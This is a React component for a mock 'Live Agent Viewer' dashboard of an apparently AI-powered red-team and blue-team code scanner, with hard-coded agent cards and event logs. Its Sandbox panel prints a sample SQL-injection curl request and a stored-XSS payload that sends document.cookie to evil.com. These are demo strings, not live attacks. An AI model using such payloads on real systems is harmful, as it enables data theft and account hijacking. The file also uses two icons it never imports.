import React from 'react';
import { Activity, Shield, Layers, RefreshCw, Terminal, Play, Search, AlertCircle, Eye, Box, Database, Lock, CheckCircle2 } from 'lucide-react';

export default function Scan() {
    const agents = [
        { name: "Recon", role: "Reconnaissance Agent", desc: "Scans attack surface, maps endpoints, discovers entry points", status: "Done", icon: Search, actions: 47 },
        { name: "Exploit", role: "Exploit Agent", desc: "Crafts and executes exploits against discovered vulnerabilities", status: "Active", icon: Activity, actions: 12 },
        { name: "Taint", role: "Taint Analyzer", desc: "Traces data flow from sources to sinks for injection detection", status: "Active", icon: Layers, actions: 23 },
        { name: "Sandbox", role: "Sandbox Runner", desc: "Executes exploit payloads in isolated Docker sandbox", status: "Booting", icon: Box, actions: 5 },
        { name: "Reporter", role: "Report Generator", desc: "Compiles findings into structured vulnerability reports", status: "Idle", icon: Terminal, actions: 0 },
        { name: "Linter", role: "Static Analyzer", desc: "Runs Semgrep rules and Tree-sitter queries for pattern detection", status: "Done", icon: Code, actions: 156 },
        { name: "DepCheck", role: "Dependency Auditor", desc: "Audits npm/pip packages for CVEs and outdated versions", status: "Active", icon: Database, actions: 44 },
        { name: "Complexity", role: "Complexity Analyzer", desc: "Measures cyclomatic complexity, nesting depth, function length", status: "Done", icon: Activity, actions: 81 },
        { name: "Reviewer", role: "LLM Code Reviewer", desc: "AI-powered code review for architectural smells and best practices", status: "Booting", icon: Eye, actions: 0 },
        { name: "Suggester", role: "Fix Suggester", desc: "Generates actionable fix suggestions with code diffs", status: "Idle", icon: RefreshCw, actions: 0 },
    ];

    const events = [
        { time: "14:23:01", source: "Recon", text: "Recon Agent initialized. Loading target: github.com/acme/api-server", type: "info" },
        { time: "14:23:02", source: "Recon", text: "tree-sitter parse -> 847 files indexed, 34 endpoints discovered", type: "success" },
        { time: "14:23:04", source: "Linter", text: "Static Analyzer online. Loading Semgrep ruleset: p/typescript + custom/vibecheck", type: "info" },
        { time: "14:23:05", source: "Recon", text: "+ Exploit: Found 3 unprotected POST endpoints without auth middleware", type: "warning" },
        { time: "14:23:06", source: "Linter", text: "semgrep scan completed: 23 findings across 12 files", type: "success" },
        { time: "14:23:08", source: "Exploit", text: "Exploit Agent initialized. Received 3 targets from Recon", type: "warning" },
        { time: "14:23:09", source: "Taint", text: "Taint Analyzer started. Building data flow graph...", type: "info" },
        { time: "14:23:10", source: "DepCheck", text: "Dependency Auditor online. Running npm audit...", type: "info" },
        { time: "14:23:11", source: "Taint", text: "FalkorDB query: MATCH (s:Source)-[:FLOWS_TO*1..]->(k:Sink) -> 7 tainted paths found", type: "warning" },
        { time: "14:25:01", source: "DepCheck", text: "npm audit: 4 critical, 7 high severity vulnerabilities. express@4.17.1 -> 4.21.0 required", type: "critical" },
    ];

    const getStatusColor = (status: string) => {
        switch (status) {
            case 'Active': return 'text-emerald-400';
            case 'Done': return 'text-emerald-500/70';
            case 'Booting': return 'text-yellow-500';
            case 'Idle': return 'text-gray-500';
            default: return 'text-gray-500';
        }
    };

    const getStatusIndicator = (status: string) => {
        switch (status) {
            case 'Active': return <span className="w-2 h-2 rounded-full bg-emerald-400 shadow-[0_0_8px_rgba(52,211,153,0.8)] animate-pulse"></span>;
            case 'Done': return <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500/70" />;
            case 'Booting': return <RefreshCw className="w-3.5 h-3.5 text-yellow-500 animate-spin" />;
            case 'Idle': return <span className="w-2 h-2 rounded-full bg-gray-600"></span>;
            default: return null;
        }
    };

    const getEventIcon = (source: string, type: string) => {
        if (type === 'critical') return <AlertCircle className="w-3.5 h-3.5 text-red-500" />;
        if (type === 'warning') return <AlertTriangle className="w-3.5 h-3.5 text-orange-400" />;
        if (type === 'success') return <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />;

        // Info icons based on source
        const agent = agents.find(a => a.name === source);
        const Icon = agent?.icon || Terminal;
        return <Icon className="w-3.5 h-3.5 text-blue-400" />;
    };

    const getEventSourceColor = (source: string) => {
        const isRedTeam = ["Recon", "Exploit", "Taint", "Sandbox"].includes(source);
        return isRedTeam ? 'text-red-400 border-red-900/40 bg-red-900/10' : 'text-blue-400 border-blue-900/40 bg-blue-900/10';
    };

    return (
        <div className="flex flex-col h-full overflow-hidden p-6 md:p-8 max-w-7xl mx-auto">
            {/* Header */}
            <div className="mb-6 flex-shrink-0 flex items-center justify-between">
                <div className="flex flex-col">
                    <h1 className="text-2xl font-bold font-sans tracking-tight text-white mb-1">Live Agent Viewer</h1>
                    <p className="text-gray-400 text-sm">Watch agents boot up, communicate, and interact with the sandbox</p>
                </div>
                <div className="hidden md:flex items-center gap-4 text-xs font-mono">
                    <div className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-emerald-400"></span><span className="text-emerald-400">3 active</span></div>
                    <div className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-yellow-500"></span><span className="text-yellow-500">2 booting</span></div>
                    <div className="flex items-center gap-1.5 text-gray-500">20 events</div>
                </div>
            </div>

            {/* Filters (Mock) */}
            <div className="flex items-center gap-6 mb-6 border-b border-gray-800/80 pb-4">
                <button className="text-sm font-medium text-white pb-4 border-b-2 border-emerald-500 -mb-4 flex items-center gap-2">
                    <Activity className="w-4 h-4" />
                    All Agents
                </button>
                <button className="text-sm font-medium text-gray-400 hover:text-gray-200 pb-4 border-b-2 border-transparent -mb-4 flex items-center gap-2 transition-colors">
                    <Shield className="w-4 h-4" />
                    Red Team
                </button>
                <button className="text-sm font-medium text-gray-400 hover:text-gray-200 pb-4 border-b-2 border-transparent -mb-4 flex items-center gap-2 transition-colors">
                    <Code className="w-4 h-4" />
                    Blue Team
                </button>
            </div>

            {/* Main Content Area */}
            <div className="flex-1 overflow-y-auto overflow-x-hidden space-y-6 custom-scrollbar pb-8">

                {/* Agent Grid */}
                <div>
                    <h2 className="text-sm font-medium text-gray-300 font-mono flex items-center gap-2 mb-4">
                        <Activity className="w-4 h-4" />
                        Agent Grid
                    </h2>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4">
                        {agents.map((agent, i) => {
                            const isRedTeam = ["Recon", "Exploit", "Taint", "Sandbox", "Reporter"].includes(agent.name);
                            const isBlueTeam = !isRedTeam;

                            return (
                                <div key={i} className={`bg-[#111214] border rounded-lg p-4 flex flex-col justify-between h-36 relative overflow-hidden group transition-all duration-300 ${agent.status === 'Active'
                                        ? (isRedTeam ? 'border-red-500/30 shadow-[0_0_15px_rgba(239,68,68,0.05)]' : 'border-blue-500/30 shadow-[0_0_15px_rgba(59,130,246,0.05)]')
                                        : 'border-gray-800/80 hover:border-gray-700'
                                    }`}>
                                    {agent.status === 'Active' && (
                                        <div className={`absolute left-0 top-0 bottom-0 w-1 ${isRedTeam ? 'bg-red-500/50' : 'bg-blue-500/50'}`}></div>
                                    )}

                                    <div>
                                        <div className="flex justify-between items-start mb-2">
                                            <div className="flex items-center gap-2">
                                                <div className={`w-1.5 h-1.5 rounded-full ${isRedTeam ? 'bg-red-500' : 'bg-blue-500'}`}></div>
                                                <span className="font-semibold text-sm text-gray-200">{agent.name}</span>
                                            </div>
                                            <div className={`flex items-center gap-1.5 text-[10px] font-mono uppercase tracking-wider ${getStatusColor(agent.status)}`}>
                                                {getStatusIndicator(agent.status)}
                                                {agent.status}
                                            </div>
                                        </div>
                                        <div className="text-xs text-gray-400 font-mono truncate">{agent.role}</div>
                                        <div className="text-[10px] text-gray-500 mt-2 line-clamp-2 leading-relaxed h-8">{agent.desc}</div>
                                    </div>

                                    <div className="flex items-center gap-2 text-[10px] text-gray-600 font-mono mt-2 pt-2 border-t border-gray-800/40">
                                        <Activity className="w-3 h-3" />
                                        {agent.actions} actions
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>

                {/* Bottom Split (Events + Sandbox) */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

                    {/* Event Feed */}
                    <div className="lg:col-span-2 flex flex-col h-80">
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-sm font-medium text-gray-300 font-mono flex items-center gap-2">
                                <Terminal className="w-4 h-4" />
                                Event Feed
                            </h2>
                            <span className="text-[10px] text-gray-500 font-mono">20 events</span>
                        </div>

                        <div className="flex-1 bg-[#0A0A0B] border border-gray-800/80 rounded-lg p-1 overflow-hidden flex flex-col shadow-inner">
                            <div className="flex-1 overflow-y-auto p-4 custom-scrollbar space-y-3 font-mono text-xs">
                                {events.map((event, i) => (
                                    <div key={i} className="flex items-start gap-4">
                                        <div className="text-gray-600 w-16 flex-shrink-0">{event.time}</div>
                                        <div className="flex items-center gap-2 mt-0.5 flex-shrink-0">
                                            {getEventIcon(event.source, event.type)}
                                            <span className={`px-1.5 py-0.5 rounded border text-[10px] uppercase tracking-wider w-16 text-center ${getEventSourceColor(event.source)}`}>
                                                {event.source}
                                            </span>
                                        </div>
                                        <div className={`leading-relaxed break-all ${event.type === 'critical' ? 'text-red-400' :
                                                event.type === 'warning' ? 'text-gray-300' : 'text-gray-400'
                                            }`}>
                                            {event.text.split('->').map((part, k, arr) => (
                                                <React.Fragment key={k}>
                                                    {part}
                                                    {k < arr.length - 1 && <span className="text-gray-600"> -> </span>}
                                                </React.Fragment>
                                            ))}
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>

                    {/* Sandbox */}
                    <div className="flex flex-col h-80">
                        <div className="flex justify-between items-center mb-4">
                            <h2 className="text-sm font-medium text-orange-400 font-mono flex items-center gap-2">
                                <Box className="w-4 h-4" />
                                Sandbox
                            </h2>
                            <div className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-orange-500 animate-pulse"></span><span className="text-[10px] text-orange-400 font-mono uppercase tracking-wider">LIVE</span></div>
                        </div>

                        <div className="flex-1 bg-[#050505] border border-orange-900/30 rounded-lg p-4 overflow-y-auto custom-scrollbar shadow-inner relative">
                            <div className="absolute top-0 right-0 p-2 text-gray-800">
                                <Box className="w-24 h-24 opacity-5 pointer-events-none" />
                            </div>

                            <div className="font-mono space-y-4">
                                <div>
                                    <div className="text-orange-500/80 text-xs mb-1">$ curl -X POST http://target:8000/api/users?search=' OR 1=1 --</div>
                                    <div className="text-gray-400 text-xs break-all">→ HTTP 200: [{`{"id":1,"email":"admin@acme.com",...}`}]</div>
                                </div>

                                <div className="border-t border-gray-800/60 pt-4">
                                    <div className="text-orange-500/80 text-xs mb-1">$ curl -X POST http://target:8000/api/comments -d '{`"body":"<script>fetch(\\"https://evil.com/steal?c=\\"+document.cookie)</script>"`}'</div>
                                    <div className="text-gray-400 text-xs break-all">→ HTTP 201: Comment created. Payload reflected in response.</div>
                                </div>

                                <div className="border-t border-gray-800/60 pt-4 animate-pulse">
                                    <div className="text-orange-500/80 text-xs mb-1">$ <span className="w-2 h-4 bg-orange-500 inline-block align-middle ml-1"></span></div>
                                </div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>

        </div>
    );
}
